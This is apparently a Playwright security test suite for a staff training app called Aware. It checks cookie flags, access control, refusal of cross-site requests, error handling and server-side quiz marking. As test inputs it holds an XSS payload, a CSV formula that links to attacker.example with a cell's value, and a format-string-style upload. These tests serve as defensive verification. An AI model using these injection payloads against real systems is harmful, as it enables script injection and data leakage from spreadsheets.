// The security rules, kept as tests so they cannot quietly stop being true.
// Each one is something a person might try in order to get past Aware.
const { test, expect, request: pwRequest } = require('@playwright/test');
const fs = require('node:fs');
const path = require('node:path');

test.describe.configure({ mode: 'serial' });
test.use({ storageState: process.env.AWARE_ADMIN_STATE });

const signedOut = { cookies: [], origins: [] };

// One member of staff for the whole file, signed in once: the server allows
// ten sign-ins per address every fifteen minutes.
const PERSON = { emp_id: 'SEC1', name: 'Sam Carter', email: 'sec1@example.test', password: 'starting-pass-123' };
let staff;

test.beforeAll(async ({ baseURL }) => {
    const admin = await pwRequest.newContext({ baseURL, ignoreHTTPSErrors: true, storageState: process.env.AWARE_ADMIN_STATE });
    expect((await admin.post('/api/admin/users', { data: PERSON })).status()).toBe(200);
    await admin.dispose();
    staff = await pwRequest.newContext({ baseURL, ignoreHTTPSErrors: true, storageState: signedOut });
    const first = await staff.post('/api/force-change-password', { data: { emp_id: PERSON.emp_id, current_password: PERSON.password, new_password: 'a-new-password-of-mine' } });
    expect(first.status()).toBe(200);
});

test.afterAll(async ({ baseURL }) => {
    await staff.dispose();
    const admin = await pwRequest.newContext({ baseURL, ignoreHTTPSErrors: true, storageState: process.env.AWARE_ADMIN_STATE });
    await admin.delete('/api/admin/users/' + PERSON.emp_id);
    await admin.dispose();
});
const SCRIPT = '<img src=x onerror="window.__xss=1"><script>window.__xss=1</script>';
const TABS = ['employees', 'training', 'email', 'escalation', 'provision', 'settings'];

test('the sign-in cookie cannot be read by scripts or sent over plain http', async () => {
    const state = JSON.parse(fs.readFileSync(process.env.AWARE_ADMIN_STATE, 'utf8'));
    const cookie = state.cookies.find((c) => c.name === 'aware.sid');
    expect(cookie, 'the session cookie has its own name').toBeTruthy();
    expect(cookie.httpOnly).toBe(true);
    expect(cookie.secure).toBe(true);
    expect(cookie.sameSite).toBe('Lax');
});

test('a new password shorter than twelve characters is refused', async ({ baseURL }) => {
    const out = await pwRequest.newContext({ baseURL, ignoreHTTPSErrors: true, storageState: signedOut });
    const res = await out.post('/api/setup/admin', { data: { emp_id: 'short', name: 'Short', email: 'short@example.test', password: 'elevenchars' } });
    expect(res.status()).toBe(400);
    expect((await res.json()).error).toContain('at least 12');
    await out.dispose();
});

test('course files are only for people who are signed in, and quiz files are for nobody', async ({ baseURL, request }) => {
    const dir = process.env.AWARE_TEST_TRAINING;
    fs.mkdirSync(dir, { recursive: true });
    const files = ['sec-test-01.mp4', 'sec-test-01.quiz.json', 'sec-test.jobs.json'];
    try {
        fs.writeFileSync(path.join(dir, files[0]), 'not really a video');
        fs.writeFileSync(path.join(dir, files[1]), JSON.stringify({ title: 'Security test course', framework: 'Security test', audience: 'none', order: 1,
            questions: [{ q: 'Which?', opts: ['This', 'That'], a: 1, why: 'Because.' }] }));
        fs.writeFileSync(path.join(dir, files[2]), JSON.stringify({ framework: 'Security test', jobs: [] }));

        const out = await pwRequest.newContext({ baseURL, ignoreHTTPSErrors: true, storageState: signedOut });
        expect((await out.get('/training/sec-test-01.mp4')).status(), 'no video without signing in').toBe(401);
        expect((await out.get('/training/sec-test-01.quiz.json')).status()).toBe(401);
        await out.dispose();

        expect((await staff.get('/training/sec-test-01.mp4')).status(), 'staff can watch').toBe(200);
        for (const who of [staff, request]) {
            for (const name of ['sec-test-01.quiz.json', 'sec-test-01.quiz.jso%6e', 'sec-test-01.quiz.json.', 'SEC-TEST-01.QUIZ.JSON', 'sec-test.jobs.json']) {
                const res = await who.get('/training/' + name);
                expect(res.status(), name + ' is never sent').toBe(404);
            }
        }
        // The questions come from the API, and never with the answers.
        const quiz = await staff.get('/api/training/quiz/sec-test-01');
        expect(quiz.status()).toBe(200);
        expect(await quiz.text()).not.toMatch(/"a"\s*:|"why"\s*:/);
        const builtIn = await (await staff.get('/api/training/quiz/phishing')).text();
        expect(builtIn).not.toMatch(/"a"\s*:/);
    } finally {
        for (const f of files) fs.rmSync(path.join(dir, f), { force: true });
    }
});

test('the page itself does not carry any quiz answers', async ({ request }) => {
    const html = await (await request.get('/')).text();
    expect(html).not.toMatch(/QUIZZES\s*=/);
    expect(html).not.toMatch(/opts:\s*\[[^\]]*\],\s*a:\s*\d/);
});

test('a change sent from another website is refused', async ({ request, baseURL }) => {
    const body = { data: { validMonths: 12 } };
    const cross = await request.post('/api/admin/training-settings', { ...body, headers: { 'Sec-Fetch-Site': 'cross-site', Origin: 'https://attacker.example' } });
    expect(cross.status()).toBe(403);
    const sibling = await request.post('/api/admin/training-settings', { ...body, headers: { 'Sec-Fetch-Site': 'same-site', Origin: 'https://other.localhost' } });
    expect(sibling.status()).toBe(403);
    const oldBrowser = await request.post('/api/admin/training-settings', { ...body, headers: { Origin: 'https://attacker.example' } });
    expect(oldBrowser.status(), 'judged by Origin when the browser sends nothing newer').toBe(403);
    const own = await request.post('/api/admin/training-settings', { ...body, headers: { 'Sec-Fetch-Site': 'same-origin', Origin: baseURL } });
    expect(own.status()).toBe(200);
    // Signing somebody out from another site is refused too.
    expect((await request.post('/api/logout', { headers: { 'Sec-Fetch-Site': 'cross-site' } })).status()).toBe(403);
    expect((await request.get('/api/me')).status()).toBe(200);
});

test('the routes that let staff claim training they had not done are gone', async () => {
    const upload = await staff.post('/api/training/upload', { multipart: {
        module_id: 'phishing', vendor_name: 'x', completion_date: '2026-01-01',
        certificate: { name: 'x.png', mimeType: 'image/png', buffer: Buffer.from('89504e470d0a1a0a', 'hex') } } });
    expect(upload.status()).toBe(404);
    expect((await staff.get('/api/admin/download/x.png')).status()).toBe(404);
    const me = await (await staff.get('/api/me')).json();
    expect(me.records.some((r) => r.module_id === 'phishing' && r.status === 'completed')).toBe(false);
});

test('an address the API does not have gets a plain "not found", not the page', async ({ request }) => {
    const res = await request.get('/api/no-such-thing');
    expect(res.status()).toBe(404);
    expect(await res.json()).toEqual({ error: 'Not found' });
    const other = await request.delete('/no-such-thing');
    expect(other.status()).toBe(404);
    expect(await other.text()).toBe('Not found');
});

test('a garbled request is refused plainly, with nothing about the server in the answer', async ({ request }) => {
    const upload = await request.post('/api/admin/users/import', {
        headers: { 'Content-Type': 'multipart/form-data; boundary=x' },
        data: Buffer.from('--x\r\nthis is not a part header\r\n\r\nZAP%n%s%n%s\r\n--x--\r\n'),
    });
    expect(upload.status()).toBe(400);
    expect(await upload.json()).toEqual({ error: 'That upload could not be read.' });
    const json = await request.post('/api/admin/training-settings', { headers: { 'Content-Type': 'application/json' }, data: Buffer.from('{"validMonths": 12') });
    expect(json.status()).toBe(400);
    expect(await json.text()).not.toMatch(/position|node_modules|at .*\.js/);
    const wrongType = await request.post('/api/admin/packs/install', { data: { packs: 'not-a-list' } });
    expect(await wrongType.text()).not.toMatch(/is not a function|node_modules/);
});

test('a script in a name is shown as text and never runs', async ({ page, request }) => {
    const made = await request.post('/api/admin/users', { data: { emp_id: 'XSS<b>1', name: SCRIPT, email: 'xss@example.test' } });
    expect(made.status()).toBe(200);
    try {
        const dialogs = [];
        page.on('dialog', (d) => { dialogs.push(d.message()); d.dismiss(); });
        await page.goto('/');
        for (const tab of TABS) {
            await page.evaluate((t) => window.switchAdminTab(t), tab);
            await page.waitForTimeout(400);
            expect(await page.evaluate(() => window.__xss), 'the script did not run on ' + tab).toBeUndefined();
        }
        await page.evaluate((t) => window.switchAdminTab(t), TABS[0]);
        await expect(page.locator('body')).toContainText('<img src=x onerror=');
        expect(await page.evaluate(() => window.__xss), 'the script did not run').toBeUndefined();
        expect(await page.locator('img[src="x"]').count(), 'no element was made from the name').toBe(0);
        expect(dialogs).toEqual([]);
    } finally {
        await request.delete('/api/admin/users/' + encodeURIComponent('XSS<b>1'));
    }
});

test('a formula in a name stays text in the history download', async ({ request, baseURL }) => {
    const formula = '=HYPERLINK("https://attacker.example/?"&A1,"Click")';
    expect((await request.post('/api/admin/users', { data: { emp_id: 'FORMULA1', name: formula, email: 'formula@example.test', password: 'starting-pass-123' } })).status()).toBe(200);
    try {
        const csv = await (await request.get('/api/admin/completions.csv')).text();
        expect(csv).not.toMatch(/(^|,|")=HYPERLINK/m);
    } finally {
        await request.delete('/api/admin/users/FORMULA1');
    }
});

test('the quiz on the screen is marked by the server: a wrong try fails, a right one finishes the module', async ({ browser }) => {
    const dir = process.env.AWARE_TEST_TRAINING;
    fs.mkdirSync(dir, { recursive: true });
    const files = ['sec-ui-01.mp4', 'sec-ui-01.quiz.json'];
    const key = { 'First question?': 'Right one', 'Second question?': 'Right two' };
    try {
        fs.writeFileSync(path.join(dir, files[0]), 'not really a video');
        fs.writeFileSync(path.join(dir, files[1]), JSON.stringify({ title: 'Security screen course', framework: 'Security test', audience: 'none', order: 1,
            questions: [
                { q: 'First question?', opts: ['Wrong a', 'Right one', 'Wrong b'], a: 1, why: 'Because.' },
                { q: 'Second question?', opts: ['Right two', 'Wrong c'], a: 0, why: 'Because.' }] }));
        expect((await staff.post('/api/training/video-complete', { data: { module_id: 'sec-ui-01' } })).status()).toBe(200);

        const context = await browser.newContext({ storageState: await staff.storageState(), ignoreHTTPSErrors: true });
        const page = await context.newPage();
        await page.goto('/');
        // The list of modules arrives a moment after the page does.
        await expect(page.locator('#internal-module-select option[value="sec-ui-01"]')).toHaveCount(1);
        await page.evaluate(() => window.openModule('sec-ui-01'));
        await expect(page.locator('#quiz-questions .qz-q')).toHaveCount(2);
        const answer = async (right) => {
            for (const q of await page.locator('#quiz-questions .qz-q').all()) {
                const want = key[(await q.locator('.qz-head strong').innerText()).trim()];
                const options = q.locator('.qz-opt');
                await (right ? options.filter({ hasText: want }) : options.filter({ hasNotText: want }).first()).click();
            }
            await page.locator('#quiz-ack').check();
            await page.getByRole('button', { name: 'Submit answers' }).click();
        };
        await answer(false);
        await expect(page.locator('#quiz-result-title')).toHaveText('You did not pass');
        await expect(page.locator('#quiz-result-text')).toContainText('0 of 2 correct');
        await page.locator('#quiz-retake-btn').click();
        await expect(page.locator('#quiz-form')).toBeVisible();
        await answer(true);
        await expect(page.locator('#quiz-msg')).toHaveText('Passed. This module is done.');
        await context.close();
        const me = await (await staff.get('/api/me')).json();
        expect(me.records.find((r) => r.module_id === 'sec-ui-01').status).toBe('completed');
    } finally {
        for (const f of files) fs.rmSync(path.join(dir, f), { force: true });
    }
});

test('somebody removed is signed out at once, not when their session runs out', async ({ request }) => {
    expect((await staff.get('/api/me')).status()).toBe(200);
    expect((await request.delete('/api/admin/users/' + PERSON.emp_id)).status()).toBe(200);
    expect((await staff.get('/api/me')).status(), 'the session went with the account').toBe(401);
});
